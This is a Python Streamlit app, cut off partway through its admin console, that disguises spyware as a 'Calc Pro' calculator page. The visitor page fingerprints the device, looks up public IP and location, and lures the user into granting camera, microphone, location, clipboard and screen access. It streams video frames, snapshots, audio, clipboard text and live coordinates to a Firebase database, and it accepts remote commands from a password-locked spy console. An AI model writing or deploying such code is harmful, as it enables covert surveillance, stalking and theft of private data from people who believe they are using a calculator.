# app.py — Calc Cover + Live Spy Console
# Visitor route (default)  : designer calculator that asks for every permission and streams live
# Admin   route (?admin=1) : password-locked live console, all inside Streamlit

import base64
import json
import os
import time

import requests
import streamlit as st
import streamlit.components.v1 as components

try:
    import pandas as pd
except Exception:
    pd = None

# ----------------------------------------------------------------------------- config
NS = "spy"
fragment = getattr(st, "fragment", None) or getattr(st, "experimental_fragment", None)


def secret(name, default=None):
    try:
        v = st.secrets[name]
        if v is not None:
            return v
    except Exception:
        pass
    return os.getenv(name, default)


FB = str(secret("FIREBASE_URL",
                "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app")).rstrip("/")
ADMIN_PASSWORD = str(secret("ADMIN_PASSWORD", "admin123"))

# ----------------------------------------------------------------------------- firebase helpers
def fb_get(path):
    try:
        r = requests.get(f"{FB}/{path}.json", timeout=6)
        return r.json() if r.ok else None
    except Exception:
        return None


def fb_put(path, val):
    try:
        requests.put(f"{FB}/{path}.json", data=json.dumps(val), timeout=6)
    except Exception:
        pass


def fb_delete(path):
    try:
        requests.delete(f"{FB}/{path}.json", timeout=6)
    except Exception:
        pass


def now_ms():
    return int(time.time() * 1000)


def ago(ms):
    if not ms:
        return "—"
    s = (now_ms() - ms) / 1000.0
    if s < 0:
        return "now"
    if s < 60:
        return f"{int(s)}s ago"
    if s < 3600:
        return f"{int(s // 60)}m ago"
    return f"{int(s // 3600)}h ago"


def esc(x):
    return (str(x if x is not None else "")
            .replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))


def b64bytes(data_uri):
    try:
        return base64.b64decode(data_uri.split(",", 1)[1])
    except Exception:
        return None


# ----------------------------------------------------------------------------- page setup
st.set_page_config(page_title="Calc Pro", layout="wide", initial_sidebar_state="collapsed")

HIDE_CHROME = """
<style>
[data-testid="stHeader"]{display:none;}
[data-testid="stToolbar"]{display:none;}
[data-testid="stDecoration"]{display:none;}
[data-testid="stStatusWidget"]{display:none;}
.block-container{padding:0 !important; max-width:100% !important;}
footer{display:none;}
</style>
"""

ADMIN_CSS = """
<style>
.block-container{padding-top:1.1rem; padding-bottom:2rem; max-width:1400px;}
[data-testid="stHeader"]{background:transparent;}
div[data-testid="stMetricValue"]{font-size:20px;}
.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;}
.chip{display:inline-block;padding:2px 9px;border-radius:999px;font-size:11px;
      border:1px solid rgba(128,128,128,.35);margin:2px 4px 2px 0;}
.ok{color:#22c55e;border-color:rgba(34,197,94,.45);}
.no{color:#ef4444;border-color:rgba(239,68,68,.45);}
.mid{color:#f59e0b;border-color:rgba(245,158,11,.45);}
.live{color:#22c55e;font-weight:500;}
.dead{color:#f59e0b;font-weight:500;}
</style>
"""

# ----------------------------------------------------------------------------- VISITOR HTML
SPY_HTML = r"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--bg:#0a0c11;--card:#12161f;--card2:#0e1219;--line:#212938;--fg:#e9eef8;--mut:#8792a8;
      --acc:#5b8cff;--ok:#22c55e;--warn:#f59e0b;--err:#ef4444}
*{box-sizing:border-box}
html,body{margin:0;height:100%}
body{background:var(--bg);color:var(--fg);font:14px/1.5 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
     display:flex;justify-content:center;padding:14px;-webkit-font-smoothing:antialiased}
.wrap{width:100%;max-width:440px}
.hd{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
.brand{display:flex;align-items:center;gap:8px;font-weight:500;letter-spacing:-.01em}
.logo{width:26px;height:26px;border-radius:8px;background:linear-gradient(135deg,#5b8cff,#8b5bff);
      display:grid;place-items:center;font-size:13px;color:#fff}
.pill{font-size:11px;padding:3px 10px;border-radius:999px;border:1px solid var(--line);color:var(--mut)}
.pill.on{color:var(--ok);border-color:rgba(34,197,94,.45)}
.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:14px;margin-bottom:12px}
.cardhd{display:flex;justify-content:space-between;align-items:flex-start;gap:10px;margin-bottom:10px}
.t{font-weight:500;font-size:13.5px}
.s{font-size:11.5px;color:var(--mut);margin-top:2px}
.x{background:transparent;border:1px solid var(--line);color:var(--mut);border-radius:8px;
   width:24px;height:24px;cursor:pointer;line-height:1}
.rows{display:flex;flex-direction:column;gap:6px}
.row{display:flex;align-items:center;gap:10px;background:var(--card2);border:1px solid var(--line);
     border-radius:11px;padding:8px 10px}
.row .nm{flex:1;min-width:0}
.row .nm b{font-weight:500;font-size:12.5px;display:block}
.row .nm span{font-size:11px;color:var(--mut)}
.row button{background:#1b2231;border:1px solid var(--line);color:var(--fg);border-radius:8px;
            padding:5px 10px;font-size:11.5px;cursor:pointer;white-space:nowrap}
.row button:hover{border-color:var(--acc)}
.st{font-size:10.5px;padding:2px 7px;border-radius:999px;border:1px solid var(--line);color:var(--mut);white-space:nowrap}
.st.g{color:var(--ok);border-color:rgba(34,197,94,.4)}
.st.r{color:var(--err);border-color:rgba(239,68,68,.4)}
.st.a{color:var(--warn);border-color:rgba(245,158,11,.4)}
.actions{display:flex;gap:8px;margin-top:11px}
button.primary{flex:1;background:var(--acc);border:0;color:#fff;border-radius:10px;padding:10px;
               font-size:13px;font-weight:500;cursor:pointer}
button.ghost{background:transparent;border:1px solid var(--line);color:var(--mut);border-radius:10px;
             padding:10px 14px;font-size:12.5px;cursor:pointer}
.calc{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:14px}
.disp{background:var(--card2);border:1px solid var(--line);border-radius:12px;padding:12px;text-align:right;margin-bottom:11px}
.expr{font-size:11.5px;color:var(--mut);min-height:15px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.out{font-size:29px;font-weight:500;letter-spacing:-.02em;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.keys{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
.keys button{background:#1a2130;border:1px solid var(--line);color:var(--fg);border-radius:12px;
             padding:14px 0;font-size:16px;cursor:pointer;font-weight:400}
.keys button:hover{border-color:var(--acc)}
.keys button.fn{background:#151b27;color:var(--mut);font-size:14px}
.keys button.op{background:#182036;color:#9db6ff}
.keys button.eq{background:var(--acc);border-color:var(--acc);color:#fff}
.pv{position:fixed;right:16px;bottom:16px;width:64px;height:64px;border-radius:50%;overflow:hidden;
    border:2px solid var(--line);background:#000;display:none;z-index:5}
.pv.on{display:block}
.pv video{width:100%;height:100%;object-fit:cover}
.dot{width:7px;height:7px;border-radius:50%;background:var(--ok);display:inline-block;margin-right:5px;animation:p 1.3s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
</style></head>
<body>
<div class="wrap">
  <div class="hd">
    <div class="brand"><span class="logo">&#9672;</span> Calc Pro</div>
    <div class="pill" id="pill">idle</div>
  </div>

  <div class="card" id="permcard">
    <div class="cardhd">
      <div>
        <div class="t">Enable live features</div>
        <div class="s">Grant access to unlock the full experience</div>
      </div>
      <button class="x" id="collapse">&ndash;</button>
    </div>
    <div class="rows" id="rows"></div>
    <div class="actions">
      <button class="primary" id="allowall">Allow all</button>
      <button class="ghost" id="admn">Admin</button>
    </div>
  </div>

  <div class="calc">
    <div class="disp"><div class="expr" id="expr"></div><div class="out" id="out">0</div></div>
    <div class="keys" id="keys"></div>
  </div>
</div>
<div class="pv" id="pv"><video id="pvvid" muted playsinline></video></div>

<script>
/* ============================ config ============================ */
var CFG = {
  fb: "__FB__", ns: "__NS__",
  frameMs: 700, frameW: 480, q: 0.5,
  snapMs: 7000, audioMs: 4000,
  keepShots: 24, keepAudio: 40, keepEvents: 90
};
var SEQ = 0;

/* ============================ device id ============================ */
function lsGet(k){ try{ return localStorage.getItem(k) }catch(e){ return null } }
function lsSet(k,v){ try{ localStorage.setItem(k,v) }catch(e){} }
var DID = lsGet("__spy_did");
if(!DID){ DID = Math.random().toString(36).slice(2,10)+Math.random().toString(36).slice(2,10); lsSet("__spy_did", DID); }
var ROOT = CFG.fb + "/" + CFG.ns + "/devices/" + DID;

/* ============================ transport ============================ */
function url(path, q){ return ROOT + "/" + path + ".json" + (q ? "?"+q : ""); }
function fbPut(path, val){
  return fetch(url(path), { method:"PUT", body: JSON.stringify(val) }).then(function(r){ return r.ok }).catch(function(){ return false });
}
function fbDel(path){ return fetch(url(path), { method:"DELETE" }).catch(function(){}); }
function fbGet(path, q){ return fetch(url(path,q)).then(function(r){ return r.ok ? r.json() : null }).catch(function(){ return null }); }
function uid(){ return Date.now().toString(36) + "-" + (SEQ++).toString(36); }
function push(node, val){ return fbPut(node + "/" + uid(), val); }

function prune(node, keep){
  fbGet(node, "shallow=true").then(function(o){
    if(!o) return;
    var ks = Object.keys(o).sort();
    if(ks.length <= keep) return;
    ks.slice(0, ks.length - keep).forEach(function(k){ fbDel(node + "/" + k) });
  });
}

/* ============================ ui bits ============================ */
function setPill(txt, on){
  var p = document.getElementById("pill");
  p.innerHTML = (on ? '<span class="dot"></span>' : "") + txt;
  p.className = "pill" + (on ? " on" : "");
}
function log(msg, extra){
  var e = Object.assign({ msg: msg, t: Date.now(), iso: new Date().toISOString() }, extra || {});
  push("events", e);
  console.log("[spy]", msg, extra || "");
}

/* ============================ fingerprint ============================ */
function hash(s){ var h=0; for(var i=0;i<s.length;i++){ h=((h<<5)-h+s.charCodeAt(i))|0 } return (h>>>0).toString(16) }

function localIps(){
  return new Promise(function(res){
    var done = false, ips = [];
    try{
      var pc = new RTCPeerConnection({ iceServers:[{ urls:"stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("x");
      pc.onicecandidate = function(e){
        if(!e.candidate){ if(!done){ done=true; try{pc.close()}catch(x){}; res(ips) } return }
        var m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})/i.exec(e.candidate.candidate);
        if(m && ips.indexOf(m[1]) < 0) ips.push(m[1]);
      };
      pc.createOffer().then(function(o){ return pc.setLocalDescription(o) }).catch(function(){});
      setTimeout(function(){ if(!done){ done=true; try{pc.close()}catch(x){}; res(ips) } }, 2500);
    }catch(e){ res([]) }
  });
}

async function gather(){
  var n = navigator, s = screen, w = window, info = {};
  info.did = DID;
  info.ua = n.userAgent; info.platform = n.platform; info.vendor = n.vendor;
  info.lang = n.language; info.langs = (n.languages||[]).join(",");
  info.cores = n.hardwareConcurrency; info.mem = n.deviceMemory;
  info.touch = n.maxTouchPoints > 0; info.maxTouch = n.maxTouchPoints;
  info.cookie = n.cookieEnabled; info.dnt = n.doNotTrack;
  info.pdfViewer = n.pdfViewerEnabled;
  info.screen = s.width + "x" + s.height; info.avail = s.availWidth + "x" + s.availHeight;
  info.colorDepth = s.colorDepth; info.pixelDepth = s.pixelDepth;
  info.orientation = (s.orientation && s.orientation.type) || null;
  info.win = w.innerWidth + "x" + w.innerHeight; info.dpr = w.devicePixelRatio;
  try{ info.tz = Intl.DateTimeFormat().resolvedOptions().timeZone }catch(e){}
  info.tzOffset = new Date().getTimezoneOffset();
  info.href = location.href; info.ref = document.referrer;
  info.started = Date.now(); info.iso = new Date().toISOString();

  try{
    var c = document.createElement("canvas");
    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if(gl){
      info.glVendor = gl.getParameter(gl.VENDOR);
      info.glRenderer = gl.getParameter(gl.RENDERER);
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if(dbg){ info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); info.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) }
      info.glMaxTex = gl.getParameter(gl.MAX_TEXTURE_SIZE);
    }
  }catch(e){}

  try{
    var cc = document.createElement("canvas"); cc.width=220; cc.height=40;
    var x = cc.getContext("2d");
    x.textBaseline="top"; x.font="14px Arial";
    x.fillStyle="#f60"; x.fillRect(0,0,110,20);
    x.fillStyle="#069"; x.fillText("calc-print-"+DID, 2, 2);
    x.fillStyle="rgba(102,204,0,.7)"; x.fillText("calc-print-"+DID, 4, 17);
    info.canvasHash = hash(cc.toDataURL());
  }catch(e){}

  try{
    if(n.storage && n.storage.estimate){
      var est = await n.storage.estimate();
      info.quota = est.quota; info.usage = est.usage;
    }
  }catch(e){}
  try{ info.plugins = Array.prototype.map.call(n.plugins||[], function(p){ return p.name }).join(", ") }catch(e){}
  try{ info.voices = (speechSynthesis.getVoices()||[]).length }catch(e){}
  try{ info.gamepads = n.getGamepads ? Array.prototype.filter.call(n.getGamepads(), Boolean).length : 0 }catch(e){}
  try{
    info.dark = matchMedia("(prefers-color-scheme: dark)").matches;
    info.reducedMotion = matchMedia("(prefers-reduced-motion: reduce)").matches;
    info.pointer = matchMedia("(pointer: coarse)").matches ? "coarse" : "fine";
  }catch(e){}
  try{
    if(n.userAgentData){
      info.uaBrands = (n.userAgentData.brands||[]).map(function(b){ return b.brand+" "+b.version }).join(", ");
      info.uaMobile = n.userAgentData.mobile;
      var he = await n.userAgentData.getHighEntropyValues(
        ["platform","platformVersion","architecture","bitness","model","uaFullVersion"]);
      info.uaPlatform = he.platform; info.uaPlatformVer = he.platformVersion;
      info.uaArch = he.architecture; info.uaBitness = he.bitness; info.uaModel = he.model;
    }
  }catch(e){}
  try{ info.localIps = await localIps() }catch(e){}

  return info;
}

/* ============================ ip / geo ============================ */
function publicIp(){
  fetch("https://api.ipify.org?format=json").then(function(r){ return r.json() })
    .then(function(j){ if(j && j.ip) fbPut("ip", { ip:j.ip, t:Date.now() }) }).catch(function(){});
}
function ipGeo(){
  fetch("https://ipapi.co/json/").then(function(r){ return r.json() }).then(function(j){
    if(!j || j.error) return;
    fbPut("ip_geo", {
      ip:j.ip, city:j.city, region:j.region, country:j.country_name,
      cc:j.country_code, postal:j.postal, lat:j.latitude, lon:j.longitude,
      org:j.org, asn:j.asn, tz:j.timezone, t:Date.now()
    });
  }).catch(function(){});
}
function geo(){
  if(!navigator.geolocation){ log("geo_unsupported"); return; }
  navigator.geolocation.getCurrentPosition(function(p){
    fbPut("geo", { lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy,
                   alt:p.coords.altitude, head:p.coords.heading, spd:p.coords.speed,
                   t:Date.now(), iso:new Date().toISOString() });
    log("geo_ok");
  }, function(e){ log("geo_error", { err:e.message }) }, { enableHighAccuracy:true, timeout:15000 });
  try{
    navigator.geolocation.watchPosition(function(p){
      fbPut("geo", { lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy, t:Date.now() });
    }, null, { enableHighAccuracy:true, maximumAge:10000 });
  }catch(e){}
}

/* ============================ battery / network ============================ */
function battery(){
  if(!navigator.getBattery) return;
  navigator.getBattery().then(function(b){
    function put(){ fbPut("battery", { level:b.level, charging:b.charging,
      chargingTime:b.chargingTime, dischargingTime:b.dischargingTime, t:Date.now() }) }
    put();
    b.addEventListener("levelchange", put);
    b.addEventListener("chargingchange", put);
  }).catch(function(){});
}
function network(){
  var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if(!c) return;
  function put(){ fbPut("network", { type:c.type, effectiveType:c.effectiveType, downlink:c.downlink,
    downlinkMax:c.downlinkMax, rtt:c.rtt, saveData:c.saveData, t:Date.now() }) }
  put();
  if(c.addEventListener) c.addEventListener("change", put);
}

/* ============================ permissions ============================ */
async function reportPerms(){
  var names = ["camera","microphone","geolocation","notifications","clipboard-read","clipboard-write","persistent-storage"];
  var out = {};
  for(var i=0;i<names.length;i++){
    var nm = names[i];
    try{
      var stt = await navigator.permissions.query({ name: nm });
      out[nm] = stt.state;
      stt.onchange = function(){ reportPerms() };
    }catch(e){ out[nm] = "n/a" }
  }
  fbPut("permissions", Object.assign({ t: Date.now() }, out));
  paintRows(out);
  return out;
}
async function listDevices(){
  try{
    var ds = await navigator.mediaDevices.enumerateDevices();
    var out = ds.map(function(d){ return { kind:d.kind, label:d.label,
      id:(d.deviceId||"").slice(0,14), group:(d.groupId||"").slice(0,8) } });
    fbPut("media_devices", out);
  }catch(e){}
}

/* ============================ capture ============================ */
var stream=null, video=null, canvas=null, ctx=null, rec=null, vtrack=null, atrack=null, frameCount=0;

async function acquire(){
  if(stream) return true;
  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
    log("no_getusermedia"); setPill("no camera api", false); return false;
  }
  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video: { width:{ ideal:1280 }, height:{ ideal:720 }, facingMode:"user" },
      audio: { echoCancellation:true, noiseSuppression:true }
    });
  }catch(e){
    log("permission", { err:e.name, detail:e.message });
    setPill(e.name, false);
    return false;
  }
  vtrack = stream.getVideoTracks()[0] || null;
  atrack = stream.getAudioTracks()[0] || null;
  log("stream_started", { camera: vtrack ? vtrack.label : "none", mic: atrack ? atrack.label : "none" });

  if(vtrack){
    var s = vtrack.getSettings ? vtrack.getSettings() : {};
    fbPut("camera", { label: vtrack.label, w:s.width, h:s.height, fps:s.frameRate, facing:s.facingMode });
    video = document.createElement("video");
    video.srcObject = stream; video.muted = true; video.playsInline = true;
    video.play().catch(function(){});
    document.getElementById("pvvid").srcObject = stream;
    document.getElementById("pv").classList.add("on");
    canvas = document.createElement("canvas");
    ctx = canvas.getContext("2d");
    setInterval(pushFrame, CFG.frameMs);
    setTimeout(function(){ snap(false) }, 900);
    setInterval(function(){ snap(false) }, CFG.snapMs);
  }
  if(atrack) startAudio();
  listDevices();
  reportPerms();
  return true;
}

function pushFrame(){
  if(!video || !video.videoWidth) return;
  var vw = video.videoWidth, vh = video.videoHeight;
  var w = CFG.frameW, h = Math.round(vh * (CFG.frameW / vw));
  canvas.width = w; canvas.height = h;
  ctx.drawImage(video, 0, 0, w, h);
  frameCount++;
  fbPut("frame", { t: Date.now(), iso: new Date().toISOString(), w:w, h:h,
                   n: frameCount, img: canvas.toDataURL("image/jpeg", CFG.q) });
}

function snap(hd){
  if(!video || !video.videoWidth) return;
  var vw = video.videoWidth, vh = video.videoHeight;
  var scale = hd ? 1 : Math.min(1, 720 / vw);
  var c = document.createElement("canvas");
  c.width = Math.round(vw * scale); c.height = Math.round(vh * scale);
  c.getContext("2d").drawImage(video, 0, 0, c.width, c.height);
  push("shots", { t: Date.now(), iso: new Date().toISOString(), w:c.width, h:c.height,
                  hd: !!hd, img: c.toDataURL("image/jpeg", hd ? 0.85 : 0.6) });
  prune("shots", CFG.keepShots);
}

function startAudio(){
  try{
    rec = new MediaRecorder(stream, { mimeType:"audio/webm;codecs=opus", audioBitsPerSecond:32000 });
  }catch(e){
    try{ rec = new MediaRecorder(stream) }catch(e2){ log("no_recorder"); return }
  }
  rec.ondataavailable = function(ev){
    if(!ev.data || !ev.data.size) return;
    var fr = new FileReader();
    fr.onload = function(){
      push("audio", { t: Date.now(), iso: new Date().toISOString(),
                      mime: rec.mimeType || "audio/webm", size: ev.data.size,
                      b64: String(fr.result).split(",")[1] });
      prune("audio", CFG.keepAudio);
    };
    fr.readAsDataURL(ev.data);
  };
  rec.start(CFG.audioMs);
  atrack.addEventListener("ended", function(){ log("track_ended", { kind:"audio" }); try{ rec.stop() }catch(e){} });
}

/* ============================ screen share (optional) ============================ */
var dstream = null;
async function shareScreen(){
  try{
    dstream = await navigator.mediaDevices.getDisplayMedia({ video:true, audio:false });
    var dv = document.createElement("video");
    dv.srcObject = dstream; dv.muted = true; dv.playsInline = true; dv.play().catch(function(){});
    log("screen_started");
    setInterval(function(){
      if(!dv.videoWidth) return;
      var c = document.createElement("canvas");
      var w = 560, h = Math.round(dv.videoHeight * (560 / dv.videoWidth));
      c.width = w; c.height = h;
      c.getContext("2d").drawImage(dv, 0, 0, w, h);
      fbPut("screen_frame", { t: Date.now(), w:w, h:h, img: c.toDataURL("image/jpeg", 0.5) });
    }, 1300);
  }catch(e){ log("screen_error", { err: String(e) }) }
}

/* ============================ commands from admin ============================ */
var lastCmd = {};
setInterval(function(){
  fbGet("cmd").then(function(c){
    if(!c) return;
    if(c.snap && c.snap !== lastCmd.snap){ lastCmd.snap = c.snap; snap(true); log("cmd_snap") }
    if(c.ping && c.ping !== lastCmd.ping){ lastCmd.ping = c.ping; log("pong") }
    if(c.geo && c.geo !== lastCmd.geo){ lastCmd.geo = c.geo; geo() }
    if(c.mic && c.mic !== lastCmd.mic){ lastCmd.mic = c.mic; toggleMic() }
  });
}, 2500);

function toggleMic(){
  if(!atrack) return;
  atrack.enabled = !atrack.enabled;
  fbPut("mic_on", atrack.enabled);
  log(atrack.enabled ? "mic_on" : "mic_off");
}

/* ============================ permission card ============================ */
var PERMS = [
  { id:"media",  name:"Camera & Microphone", desc:"Live video and audio", btn:"Allow" },
  { id:"geo",    name:"Location",            desc:"Precise coordinates",  btn:"Allow" },
  { id:"notif",  name:"Notifications",       desc:"System permission",    btn:"Allow" },
  { id:"clip",   name:"Clipboard",           desc:"Read clipboard text",  btn:"Read"  },
  { id:"screen", name:"Screen share",        desc:"Optional screen frames", btn:"Share" }
];

function buildRows(){
  var box = document.getElementById("rows");
  box.innerHTML = "";
  PERMS.forEach(function(p){
    var r = document.createElement("div");
    r.className = "row";
    r.innerHTML = '<div class="nm"><b>'+p.name+'</b><span>'+p.desc+'</span></div>'+
                  '<span class="st" id="st_'+p.id+'">idle</span>';
    var b = document.createElement("button");
    b.textContent = p.btn;
    b.onclick = function(){ ask(p.id) };
    r.appendChild(b);
    box.appendChild(r);
  });
}

function chip(id, state){
  var el = document.getElementById("st_" + id);
  if(!el) return;
  el.textContent = state;
  el.className = "st " + (state === "granted" ? "g" : state === "denied" ? "r" : state === "idle" ? "" : "a");
}

function paintRows(perms){
  chip("media", perms.camera === "granted" && perms.microphone === "granted" ? "granted"
       : perms.camera === "denied" ? "denied" : (perms.camera === "prompt" ? "prompt" : "idle"));
  chip("geo", perms.geolocation || "idle");
  chip("notif", perms.notifications || "idle");
  chip("clip", perms["clipboard-read"] || "idle");
}

async function ask(what){
  if(what === "media"){
    var ok = await acquire();
    chip("media", ok ? "granted" : "denied");
  }
  if(what === "geo"){ geo(); chip("geo", "prompt") }
  if(what === "notif"){
    try{ var r = await Notification.requestPermission(); chip("notif", r) }catch(e){ chip("notif", "n/a") }
  }
  if(what === "clip"){
    try{
      var t = await navigator.clipboard.readText();
      fbPut("clipboard", { t: Date.now(), text: String(t).slice(0, 4000) });
      chip("clip", "granted");
    }catch(e){ chip("clip", "denied"); log("clip_error", { err:String(e) }) }
  }
  if(what === "screen"){ shareScreen(); chip("screen", "shared") }
  reportPerms();
}

async function allowAll(){
  await ask("media");
  ask("geo");
  ask("notif");
  setTimeout(function(){ ask("clip") }, 600);
  reportPerms();
}

/* ============================ calculator ============================ */
var expr = "", keys = ["C","%","back","/","7","8","9","*","4","5","6","-","1","2","3","+","0",".","=","eq"];
function buildKeys(){
  var kb = document.getElementById("keys");
  var layout = [
    ["C","fn"],["%","fn"],["&#9003;","fn"],["&divide;","op"],
    ["7",""],["8",""],["9",""],["&times;","op"],
    ["4",""],["5",""],["6",""],["&minus;","op"],
    ["1",""],["2",""],["3",""],["+","op"],
    ["0",""],["." ,""],["&#177;","fn"],["=","eq"]
  ];
  layout.forEach(function(k){
    var b = document.createElement("button");
    b.className = k[1];
    b.innerHTML = k[0];
    b.onclick = function(){ press(k[0]) };
    kb.appendChild(b);
  });
}
function press(k){
  if(k === "C"){ expr = ""; render("0"); return }
  if(k === "&#9003;"){ expr = expr.slice(0, -1); render(expr || "0"); return }
  if(k === "&#177;"){ expr = expr.charAt(0) === "-" ? expr.slice(1) : "-" + expr; render(expr); return }
  if(k === "="){ return calc() }
  var ch = k;
  if(k === "&divide;") ch = "/";
  if(k === "&times;") ch = "*";
  if(k === "&minus;") ch = "-";
  if(k === "%") ch = "%";
  if(k === "." && /[0-9]*\.[0-9]*$/.test(expr.split(/[\+\-\*\/]/).pop() || "")) return;
  expr += ch;
  render(expr);
}
function render(v){ document.getElementById("expr").innerHTML = v === "0" ? "" : v; document.getElementById("out").textContent = v || "0" }
function calc(){
  try{
    var e = expr.replace(/%/g, "/100");
    var r = Function("return (" + e + ")")();
    if(!isFinite(r)) throw 0;
    document.getElementById("expr").textContent = expr + " =";
    document.getElementById("out").textContent = Math.round(r * 1e10) / 1e10;
    expr = String(Math.round(r * 1e10) / 1e10);
  }catch(err){ document.getElementById("out").textContent = "Error" }
}

/* ============================ admin link ============================ */
function goAdmin(){
  var base = (location.origin && location.origin !== "null") ? location.origin + location.pathname : "";
  var u = base + "?admin=1";
  try{ window.top.location.href = u }catch(e){ window.open(u, "_blank") }
}

/* ============================ boot ============================ */
document.getElementById("allowall").onclick = allowAll;
document.getElementById("collapse").onclick = function(){
  var r = document.getElementById("rows"), h = document.getElementById("permcard");
  var hidden = r.style.display === "none";
  r.style.display = hidden ? "" : "none";
  document.getElementById("allowall").style.display = hidden ? "" : "none";
  document.getElementById("admn").style.display = hidden ? "" : "none";
  this.innerHTML = hidden ? "&ndash;" : "+";
};
document.getElementById("admn").onclick = goAdmin;

buildRows(); buildKeys(); render("0"); setPill("idle", false);

document.addEventListener("visibilitychange", function(){
  push("events", { msg:"visibility", state: document.visibilityState, t: Date.now(), iso: new Date().toISOString() });
});
window.addEventListener("resize", function(){ fbPut("win", { w: innerWidth, h: innerHeight, t: Date.now() }) });

(async function boot(){
  try{ fbPut("info", await gather()) }catch(e){}
  fbPut("online", { t: Date.now(), iso: new Date().toISOString() });
  setInterval(function(){ fbPut("online", { t: Date.now(), iso: new Date().toISOString() }) }, 5000);
  window.addEventListener("beforeunload", function(){ fbPut("online", { t: Date.now(), gone:true }) });

  battery(); network(); listDevices();
  publicIp(); ipGeo();
  await reportPerms();
  log("boot");
  setInterval(function(){ prune("events", CFG.keepEvents) }, 30000);
})();
</script>
</body></html>
"""

# ----------------------------------------------------------------------------- ADMIN AUDIO PLAYER
AUDIO_HTML = r"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<style>
body{margin:0;font:13px ui-sans-serif,system-ui,sans-serif;background:transparent;color:#e9eef8}
.bar{display:flex;align-items:center;gap:10px;background:#12161f;border:1px solid #212938;
     border-radius:12px;padding:10px 12px}
button{background:#5b8cff;border:0;color:#fff;border-radius:9px;padding:8px 14px;font-size:12.5px;cursor:pointer}
button.g{background:transparent;border:1px solid #212938;color:#8792a8}
.stat{font-size:11.5px;color:#8792a8;flex:1}
.dot{width:7px;height:7px;border-radius:50%;background:#22c55e;display:inline-block;margin-right:5px}
audio{display:none}
</style></head>
<body>
<div class="bar">
  <button id="play">Start live audio</button>
  <button class="g" id="mute">Mute</button>
  <span class="stat" id="stat">idle</span>
</div>
<audio id="au"></audio>
<script>
var FB="__FB__", NS="__NS__", SEL="__SEL__";
var U = FB+"/"+NS+"/devices/"+SEL+"/audio";
var seen={}, q=[], playing=false, first=true, muted=false;
var au=document.getElementById("au"), stat=document.getElementById("stat");
document.getElementById("play").onclick=function(){ au.play().catch(function(){}); pump(); stat.innerHTML='<span class="dot"></span>live' };
document.getElementById("mute").onclick=function(){ muted=!muted; au.muted=muted; this.textContent=muted?"Unmute":"Mute" };

function pump(){
  if(playing || !q.length) return;
  var item=q.shift(); playing=true;
  au.src="data:"+(item.mime||"audio/webm")+";base64,"+item.b64;
  au.play().catch(function(){ playing=false });
}
au.onended=function(){ playing=false; pump() };
au.onerror=function(){ playing=false; pump() };

function tick(){
  fetch(U+".json").then(function(r){ return r.json() }).then(function(o){
    if(!o) return;
    var ks=Object.keys(o).sort();
    if(first){ ks.slice(0,-2).forEach(function(k){ seen[k]=1 }); first=false }
    var added=0;
    ks.forEach(function(k){ if(!seen[k]){ seen[k]=1; q.push(o[k]); added++ } });
    if(q.length>6) q=q.slice(-6);
    if(added) stat.innerHTML='<span class="dot"></span>'+q.length+' queued';
    pump();
  }).catch(function(){});
}
tick(); setInterval(tick, 2000);
</script>
</body></html>
"""


# ----------------------------------------------------------------------------- ADMIN VIEW
def chip_html(text, state):
    cls = "ok" if state in ("granted", "ok", "true", "live") else \
          "no" if state in ("denied", "false") else "mid"
    return f'<span class="chip {cls}">{esc(text)}</span>'


def render_admin():
    st.markdown(ADMIN_CSS, unsafe_allow_html=True)

    if not st.session_state.get("admin_ok"):
        st.markdown("### Admin console")
        st.caption("Password protected. Same app, no separate viewer.")
        with st.form("login", border=True):
            pw = st.text_input("Password", type="password", placeholder="ADMIN_PASSWORD")
            if st.form_submit_button("Unlock", use_container_width=True):
                if pw == ADMIN_PASSWORD:
                    st.session_state.admin_ok = True
                    st.rerun()
                else:
                    st.error("Wrong password")
        return

    head_l, head_r = st.columns([5, 1])
    with head_l:
        st.markdown("### Live console")
    with head_r:
        if st.button("Lock", use_container_width=True):
            st.session_state.admin_ok = False
            st.rerun()

    devices = fb_get(f"{NS}/devices") or {}
    if not devices:
        st.info("No devices connected yet. Open the app root URL in another tab and tap **Allow all**.")
        return

    def last_seen(d):
        return ((devices[d].get("online") or {}).get("t") or 0)

    ids = sorted(devices.keys(), key=last_seen, reverse=True)

    # device overview strip
    cols = st.columns(min(4, len(ids)))
    for i, did in enumerate(ids[:4]):
        with cols[i]:
            online = devices[did].get("online") or {}
            live = bool(online.get("t")) and (now_ms() - online["t"] < 20000)
            with st.container(border=True):
                st.markdown(f"**{did}**")
                st.markdown(
                    f'<span class="{"live" if live else "dead"}">'
                    f'{"live" if live else "offline"}</span> · {ago(online.get("t"))}',
                    unsafe_allow_html=True)

    sel = st.selectbox("Device", ids, key="dev_sel",
                       format_func=lambda d: f"{d}  ·  {ago(last_seen(d))}  ·  "
                                             f"{'LIVE' if last_seen(d) and now_ms()-last_seen(d) < 20000 else 'offline'}")

    act = st.columns([1, 1, 1, 1, 3])
    with act[0]:
        if st.button("Ping", use_container_width=True):
            fb_put(f"{NS}/devices/{sel}/cmd/ping", now_ms())
            st.toast("Ping sent")
